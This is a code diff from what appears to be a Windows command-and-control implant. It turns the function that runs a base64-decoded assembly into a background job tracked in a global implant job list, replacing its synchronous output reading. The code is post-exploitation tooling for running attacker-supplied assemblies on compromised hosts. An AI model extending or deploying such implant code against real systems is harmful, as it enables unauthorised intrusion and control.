@@ -1,5 +1,7 @@
 #include "Command.h"
 
+#include "Implant.h"
+
 BYTE* Base64Decode(const char* input, DWORD* outLen);
 
 BOOL CommandExecuteAssembly(json& args, string artifact, json& result) {
@@ -17,7 +19,16 @@ BOOL CommandExecuteAssembly(json& args, string artifact, json& result) {
     DWORD               capacity = 4096;
     CHAR                temp[1024];
     DWORD               bytesread;
+    PJOB                Job = NULL;
 
+    Job = (JOB*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(JOB));
+    if (!Job) {
+        CloseHandle(hPipeRead);
+        return FALSE;
+    }
+
+    Job->ID     = RandomUint32();
+    Job->Status = FALSE;
 
 	data = Base64Decode(artifact.c_str(), &size);
 	if (data == NULL) {
@@ -87,37 +98,13 @@ BOOL CommandExecuteAssembly(json& args, string artifact, json& result) {
     }
 
     CloseHandle(hPipeWrite);
-
-    char* output = (char*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, capacity);
-    if (!output) {
-        CloseHandle(hPipeRead);
-        return FALSE;
-    }
-    output[0] = '\0';
-
-    while (ReadFile(hPipeRead, temp, sizeof(temp) - 1, &bytesread, NULL) && bytesread > 0) {
-        if (total + bytesread + 1 > capacity) {
-            capacity *= 2;
-            char* newOutput = (char*)HeapReAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, output, capacity);
-            if (!newOutput) {
-                HeapFree(GetProcessHeap(), 0, output);
-                CloseHandle(hPipeRead);
-                return FALSE;
-            }
-            output = newOutput;
-        }
-
-        memcpy(output + total, temp, bytesread);
-        total += bytesread;
-        output[total] = '\0';
-    }
-
-    CloseHandle(pi.hProcess);
     CloseHandle(pi.hThread);
-    CloseHandle(hPipeRead);
-    
-    result["output"] = output;    
-    HeapFree(GetProcessHeap(), 0, output);
+
+    Job->hAnonPipe  = hPipeRead;
+    Job->hProcess   = pi.hProcess;
+    Job->Status     = TRUE;
+
+    InsertTailList(&g_Implant.JobList, &Job->ListEntry);
 
     return TRUE;
 }
